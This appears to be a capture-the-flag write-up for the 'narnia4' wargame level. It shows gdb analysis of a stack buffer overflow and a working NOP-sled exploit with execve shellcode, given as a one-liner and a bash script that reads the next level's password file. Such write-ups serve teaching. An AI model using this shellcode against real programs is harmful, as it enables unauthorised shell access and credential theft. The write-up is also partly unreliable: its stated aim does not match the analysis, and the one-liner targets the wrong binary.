# narnia4

`/narnia/narnia4` can be exploited by a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) attack.

## Aim

When run, redirect program output from the default `/dev/null` device, to somewhere we can read later.

## Analysis

Last time, we used gdb's `break` and `step` to attack the problem. Sadly this time we have no such function:

```bash
(gdb) break strcpy
Breakpoint 1 at 0x8048360
(gdb) run $(printf "a%.0s" {1..256})
Starting program: /narnia/narnia4 $(printf "a%.0s" {1..256})

Breakpoint 1, 0xf7eaf680 in ?? () from /lib32/libc.so.6
(gdb) step
Cannot find bounds of current function
```

By running the program with the input increasing in 4-byte chunks from the allocated buffer, we eventually see:

```bash
(gdb) run $(printf "a%.0s" {1..272})
Starting program: /narnia/narnia4 $(printf "a%.0s" {1..272})

Program received signal SIGILL, Illegal instruction.
0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
```
```
(gdb) run $(printf "a%.0s" {1..276})
Starting program: /narnia/narnia4 $(printf "a%.0s" {1..276})

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

The `0x61616161 in ?? ()` message indicates the return pointer for `main` has been overwritten with our input 

If we analyse the core dump within gdb using `x/3000x $esp` we can see where our command line argument is still sitting in memory:

```
0xffffd620:	0x00000000	0xffffd6b4	0xffffd6c0	0xf7feacca
...
0xffffd7d0:	0x00000000	0x72616e2f	0x2f61696e	0x6e72616e
0xffffd7e0:	0x00346169	0x61616161	0x61616161	0x61616161
0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
...
0xffffd8e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8f0:	0x61616161	0x61616161	0x00000000	0x00000000
0xffffd900:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can therefore use a slightly adjusted version of our [NOP sled](https://en.wikipedia.org/wiki/NOP_slide) solution for `narnia2`

## Exploitation

See `narnia2.md` for explanation. Note our input is now 276 bytes long to match our analysis above.

Oneliner to get shell:

```bash
/narnia/narnia5 $(printf "$(printf '\x90%.0s' {1..247})\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x10\xd8\xff\xff")
```

Complete script:

```bash
#!/bin/bash

# Shellcode that will open us a shell
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# NOP sled
NOP_SLED=$(printf "\x90%.0s" {1..247})

# Pointer to where we think the NOP sled will be in memory
NOP_SLED_POINTER="\x10\xd8\xff\xff"

# Complete exploit to put in memory
EXPLOIT_ARGUMENT=$(printf "$NOP_SLED$EGGSHELL$NOP_SLED_POINTER")

# Command we want to run once given shell
printf "cat /etc/narnia_pass/narnia5" | \

# Pass to the exploitable program
/narnia/narnia4 $EXPLOIT_ARGUMENT
```

